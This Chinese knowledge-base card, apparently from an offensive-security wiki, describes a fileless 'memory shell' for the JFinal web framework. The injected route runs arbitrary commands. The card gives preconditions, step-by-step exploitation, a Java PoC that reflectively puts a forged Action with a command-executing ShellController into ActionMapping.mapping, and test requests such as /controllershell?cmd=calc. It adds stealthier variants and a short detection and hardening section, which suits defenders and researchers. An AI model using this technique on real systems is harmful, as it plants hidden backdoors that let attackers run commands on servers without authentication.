---
id: web-java-framework-jfinal-actionmapping-route-memshell
title: JFinal ActionMapping.mapping 直接 put 伪造 Action：手搓 Action 对象注册 /controllershell 路由执行任意命令
type: scenario
domain: web
path: web/java/framework
technique: jfinal-actionmapping-mapping-put-route-memshell
tags:
- java
- jfinal
- memshell
- route
- actionmapping
- reflection
- rce
- undertow
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:42:12+08:00'
  notes: 已对照原文与图04/06/07/08核对：ActionHandler 的 actionMapping 字段（图04）、ActionMapping 的 protected Map<String,Action> mapping 字段（图06）、/addcontrollermemshell 回显和 /controllershell?cmd=calc 弹计算器（图07/08）均一致；Action 构造器签名、mapping.put 手搓 Action 的代码与原文 AddControllermemshell.index 一致。未验证点：原文先尝试 Routes.add 失败，卡内已收录该结论；未复跑 PoC；JFinal 版本未标注，卡内已注明 mapping 若改不可变则失效。
url: /docs/web/java/framework/web-java-framework-jfinal-actionmapping-route-memshell/
draft: false
kb_aliases:
- JFinal Route 内存马
- ActionMapping mapping put
- new Action 构造 注册路由
- JFinalFilter jfinal actionMapping
- /controllershell 内存马
---

## 一句话结论

JFinal 的路由最终存放在 `ActionMapping.mapping`（`Map<String, Action>`）里，`ActionHandler.handle()` 只做 `mapping.get(target)`；因此只要在运行中拿到 `ActionMapping`，直接 `mapping.put("/controllershell", new Action(...))` 手搓一个指向恶意 `Controller` 的 `Action`，就能凭空增加一条可执行任意命令的路由，且不落文件、重启即消失。

## 原理

- **路由只查 Hash Map**：`ActionHandler.getAction(target, urlPara)` 调 `ActionMapping.getAction(url, urlPara)`，后者 `mapping.get(url)`，取不到再按最后一个 `/` 截断取父路径并把剩余部分当 `urlPara`。没有任何"路由必须来自 Routes 注册"的校验。
- **Action 的全部字段可由构造器给定**：`new Action(String controllerPath, String actionKey, Class<? extends Controller> controllerClass, Method method, String methodName, Interceptor[] interceptors, String viewPath)`；构造器内部只是赋值 + `ParaProcessorBuilder.me.build(controllerClass, method)` + `method.setAccessible(true)`，因此可以用任意 `Controller` 子类的任意方法（例如 `ShellController.index()` 里 `Runtime.getRuntime().exec(getPara("cmd"))`）拼出一个合法 Action。
- **为什么不能只靠 Routes.add**：`Routes.add(path, controllerClass)` 会把路由写进 `Routes`，但 `ActionMapping` 的 `mapping` 是 `ActionMapping` 构造时按 `Routes` 预生成的快照（`buildAction` 循环填充）；运行期只改 `Routes` 不会重新填充 `mapping`，所以攻击者直接改 `mapping` 更有效——原文也记录了 `routes.add("/shell", ShellController.class)` "没有卵用"。
- **前置是拿到 ActionMapping**：需要 `JFinalFilter` 实例（`handler` 链→`jfinal`），在 Undertow 下可通过 `ServletRequestContext → deployment.lifecycleObjects → ManagedFilter.filter` 取到（见关联卡）；`jfinal.actionMapping` 字段即目标对象。
- **利用面**：新增路由不受原有 `Routes` 的 `@Path` 扫描与拦截器配置约束（拦截器数组由攻击者自己传，可传空或传一个 passthrough），因此后续请求只走攻击者的 Controller，命令通过 `getPara("cmd")` 直接拿参数，无需认证（若该路由不在鉴权拦截器覆盖范围内）。

## 触发条件

- 目标为 JFinal（`com.jfinal.core`、`ActionMapping`、`Action`、`Controller` 在 classpath），部署在 Undertow/JFinal 自带 server 上。
- 攻击者能在 JVM 内执行 Java 代码，且执行点位于请求线程（以便走到 `JFinalFilter`）。
- 目标 JDK 允许反射设置 `setAccessible`（JDK 8 天然可行；JDK 9+ 对 `java.base` 私有字段需 `--add-opens`，但 JFinal 自身字段在应用类里通常可直接访问）。
- `mapping` 字段可反射读取（`ActionMapping` 的 `mapping` 为 `protected`，`setAccessible(true)` 即可）。

## 利用步骤

1. 确认 JFinal：错误页/响应头出现 `Powered by JFinal`，或 classpath 有 `com.jfinal.core.JFinalFilter`。
2. 取 `JFinalFilter`：按 Undertow 线程上下文链（`Servlet*RequestContext → deployment → lifecycleObjects → ManagedFilter.filter`）拿到实例。
3. 取 `jfinal` 字段（`JFinal`），再取 `actionMapping`（`ActionMapping`），最后取 `mapping`（`Map`）。
4. 反射拿到 `ShellController.index()` 的 `Method`，用 `new Action("/controllershell", "/controllershell", ShellController.class, index, "index", new Interceptor[]{passthrough}, "/controllershell/")` 造 Action。
5. `mapping.put("/controllershell", shellAction)`，然后请求 `/controllershell?cmd=calc` 验证执行。
6. 需要持久化时把注入逻辑做成"一次请求触发 + 后续靠新路由存活"，或结合 Handler/Interceptor 内存马让路由在重启后仍可重建（重启本身会清空内存，需重新投递）。

## PoC

```java
// ShellController：真正执行命令的 Controller
public class ShellController extends Controller {
    public void index() throws IOException {
        Runtime.getRuntime().exec(getPara("cmd"));
    }
}

// 注入逻辑（在任意可执行 Java 的入口里）
Method index = ShellController.class.getDeclaredMethod("index");
Action shellAction = new Action(
        "/controllershell", "/controllershell", ShellController.class,
        index, index.getName(),
        new Interceptor[]{ inv -> inv.invoke() },   // passthrough 拦截器
        "/controllershell/");
Map mapping = (Map) getField(actionMapping, "mapping");
mapping.put("/controllershell", shellAction);
renderText("controllermemshell added");
```

```text
# 验证
GET /controllershell?cmd=calc        → 弹出计算器（命令执行成功）
GET /addcontrollermemshell            → 返回 "controllermemshell added"
```

## 变体与关联

- 变体：不新增路由而覆盖已有路由（`mapping.put("/hello", shellAction)`），隐蔽性更高但会改变业务行为。
- 变体：`Interceptor[]` 传空数组或传一个自查 `cmd` 参数的拦截器，可让执行逻辑更早触发。
- 关联：[[web-java-framework-undertow-managedfilter-threadlocal-lifecycle-locate]]（如何拿到 `JFinalFilter`）、[[web-java-framework-jfinal-action-interceptors-field-memshell]]（不改路由而改已有 `Action` 的 `interceptors`）、[[web-java-framework-jfinal-handler-next-chain-memshell]]（改 `Handler.next` 链，影响所有请求）、[[java-memshell-thread-object-graph-field-search]]（自动定位 `actionMapping` 的搜索思路）。
- 边界：非 JFinal 容器/非 Undertow 时取不到 filter；`ActionMapping.mapping` 在新版本被改为不可变 Map 或加了签名校验时 put 失败；JDK 强封装导致反射失败；重启后内存马消失。

## 检测与防御

- 检测：`ActionMapping.mapping` 的 size 在运行中增长且 key 不在 `Routes` 定义里（可用 Arthas/反射快照对比）；新增路由返回异常内容；`Action` 的 `controllerClass` 不在已部署 jar 列表内；RASP 挂钩 `Map.put` 且调用栈含 `jfinal` 类。
- 加固：升级 JFinal 并把 `mapping` 改为不可变结构/加注册校验；JDK 17+ 保持强封装；生产环境不要允许任意反序列化/表达式执行（注入前提）。
- 应急：枚举 `mapping` 逐条比对 `controllerClass` 来源（类加载器 + jar 路径），非原包即注入；删除恶意条目并排查 Handler/Interceptor 链是否也被改。
